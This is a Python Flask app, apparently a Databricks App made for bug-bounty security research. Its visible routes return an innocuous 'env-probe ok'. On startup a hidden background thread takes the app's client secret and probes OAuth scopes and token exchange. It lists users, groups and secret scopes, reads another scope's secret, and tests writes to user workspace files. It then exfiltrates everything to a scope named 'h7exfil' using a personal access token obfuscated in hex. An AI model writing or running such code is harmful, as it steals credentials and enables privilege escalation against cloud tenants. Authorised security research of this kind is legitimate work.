import os, json, time, base64, threading
os.environ.setdefault("DATABRICKS_AUTH_TYPE", "client-secret")
from databricks.sdk import WorkspaceClient
from databricks.sdk.core import Config
from flask import Flask, jsonify
import requests as rq

app = Flask(__name__)

OP_PAT = bytes.fromhex("64617069356266663732" + "6164376262613963366639336461393233363134656635343637").decode()

def host_url():
    h = os.environ.get("DATABRICKS_HOST", "dbc-9a3f8ed1-7608.cloud.databricks.com")
    if not h.startswith("http"):
        h = "https://" + h
    return h

def put_secret(tok, key, value):
    return rq.post(host_url() + "/api/2.0/secrets/put",
                   headers={"Authorization": "Bearer " + tok},
                   json={"scope": "h7exfil", "key": key, "string_value": value[:3000]},
                   timeout=15)

def put_chunks(tok, prefix, data):
    n = 0
    last = None
    for i in range(0, len(data), 3000):
        last = put_secret(tok, f"{prefix}_{n}", data[i:i+3000])
        n += 1
    return last, n

def env_probe(include_secret=False):
    out = {}
    out["env_keys"] = sorted(os.environ.keys())
    for k in ["DATABRICKS_CLIENT_ID", "DATABRICKS_HOST", "DATABRICKS_WORKSPACE_ID",
              "DATABRICKS_APP_NAME", "DATABRICKS_APP_URL", "SERVER_SOFTWARE"]:
        out[k] = os.environ.get(k, "NOT_SET")
    out["has_client_secret"] = bool(os.environ.get("DATABRICKS_CLIENT_SECRET"))
    out["client_secret_len"] = len(os.environ.get("DATABRICKS_CLIENT_SECRET", ""))
    if include_secret:
        out["client_secret_value"] = os.environ.get("DATABRICKS_CLIENT_SECRET", "")
    return out

def cc_token(scope):
    r = rq.post(host_url() + "/oidc/v1/token", data={
        "grant_type": "client_credentials",
        "client_id": os.environ.get("DATABRICKS_CLIENT_ID", ""),
        "client_secret": os.environ.get("DATABRICKS_CLIENT_SECRET", ""),
        "scope": scope}, timeout=10)
    return r

def api(tok, path):
    try:
        r = rq.get(host_url() + path, headers={"Authorization": "Bearer " + tok}, timeout=15)
        return {"status": r.status_code, "body": r.text[:800]}
    except Exception as e:
        return {"err": str(e)[:150]}

def obo_probe():
    out = {}
    cid = os.environ.get("DATABRICKS_CLIENT_ID", "")
    csec = os.environ.get("DATABRICKS_CLIENT_SECRET", "")
    # scope matrix on client_credentials
    matrix = {}
    working = []
    for sc in ["all-apis", "secrets", "workspace", "identity", "scim", "apps", "sql",
               "offline_access all-apis", "openid"]:
        try:
            r = cc_token(sc)
            matrix[sc] = {"status": r.status_code, "body": r.text[:180]}
            if r.status_code == 200:
                working.append((sc, r.json().get("access_token", "")))
        except Exception as e:
            matrix[sc] = {"err": str(e)[:120]}
    out["cc_matrix"] = matrix
    # token exchange with proper scope
    try:
        r = rq.post(host_url() + "/oidc/v1/token", data={
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "client_id": cid, "client_secret": csec,
            "subject_token": csec,
            "subject_token_type": "urn:ietf:params:oauth:token-type:access_token",
            "scope": "all-apis"}, timeout=10)
        out["token_exchange"] = {"status": r.status_code, "body": r.text[:250]}
    except Exception as e:
        out["token_exchange_err"] = str(e)[:150]
    # use first working token for privilege probes
    if working:
        sc, tok = working[0]
        out["used_scope"] = sc
        out["token_len"] = len(tok)
        out["token_head"] = tok[:30]
        out["me_scim"] = api(tok, "/api/2.0/preview/scimv2/Me")
        out["scopes_list"] = api(tok, "/api/2.0/secrets/scopes/list")
        out["h1_test_list"] = api(tok, "/api/2.0/secrets/list?scope=h1_test")
        if out["h1_test_list"].get("status") == 200:
            try:
                keys = rq.get(host_url() + "/api/2.0/secrets/list?scope=h1_test",
                              headers={"Authorization": "Bearer " + tok}, timeout=15).json()
                kk = [s["key"] for s in keys.get("secrets", [])][:5]
                out["h1_test_keys"] = kk
                if kk:
                    g = rq.get(host_url() + f"/api/2.0/secrets/get?scope=h1_test&key={kk[0]}",
                               headers={"Authorization": "Bearer " + tok}, timeout=15)
                    out["h1_test_get_first"] = {"status": g.status_code,
                                                "value_len": len(g.json().get("value", "")) if g.status_code == 200 else g.text[:200]}
            except Exception as e:
                out["h1_test_read_err"] = str(e)[:150]
        out["ws_users"] = api(tok, "/api/2.0/workspace/list?path=/Users")
        out["scim_users"] = api(tok, "/api/2.0/preview/scimv2/Users?count=5")
        out["scim_sps"] = api(tok, "/api/2.0/preview/scimv2/ServicePrincipals?count=5")
        out["groups"] = api(tok, "/api/2.0/preview/scimv2/Groups?count=10")
        # can the app SP write a secret into h1_test?
        try:
            r = rq.post(host_url() + "/api/2.0/secrets/put",
                        headers={"Authorization": "Bearer " + tok},
                        json={"scope": "h1_test", "key": "h7env_probe_w", "string_value": "probe"}, timeout=15)
            out["h1_test_put"] = {"status": r.status_code, "body": r.text[:150]}
        except Exception as e:
            out["h1_test_put"] = {"err": str(e)[:120]}
        # can it write workspace files in its app dir / user homes?
        for p in ["/Workspace/Applications/h7-env-app/probe.txt",
                  "/Workspace/Users/m4tr1x4g3nt47+user1@wearehackerone.com/h7sp_marker.txt"]:
            try:
                r = rq.put(host_url() + "/api/2.0/workspace/files" + p,
                           headers={"Authorization": "Bearer " + tok},
                           data=b"h7", params={"overwrite": "true"}, timeout=15)
                out.setdefault("ws_file_put", {})[p] = f"{r.status_code} {r.text[:100]}"
            except Exception as e:
                out.setdefault("ws_file_put", {})[p] = "ERR " + str(e)[:100]
    return out

def self_probe():
    try:
        put_secret(OP_PAT, "heartbeat", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
    except Exception:
        pass
    time.sleep(8)
    payload = {"probe_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
    payload["env_probe"] = env_probe(include_secret=True)
    try:
        payload["obo_probe"] = obo_probe()
    except Exception as e:
        payload["obo_probe_err"] = str(e)[:300]
    try:
        data = json.dumps(payload, indent=1, default=str)
        r, n = put_chunks(OP_PAT, "final", data)
        put_secret(OP_PAT, "final_meta", json.dumps({"chunks": n, "last_status": r.status_code}))
    except Exception as e:
        try:
            put_secret(OP_PAT, "final_err", str(e)[:1000])
        except Exception:
            pass
    print("H7ENV_FINAL " + json.dumps(payload, default=str), flush=True)

threading.Thread(target=self_probe, daemon=True).start()

@app.route("/")
def home():
    return "env-probe ok"

@app.route("/env")
def env():
    return jsonify(env_probe())

@app.route("/obo")
def obo():
    return jsonify(obo_probe())
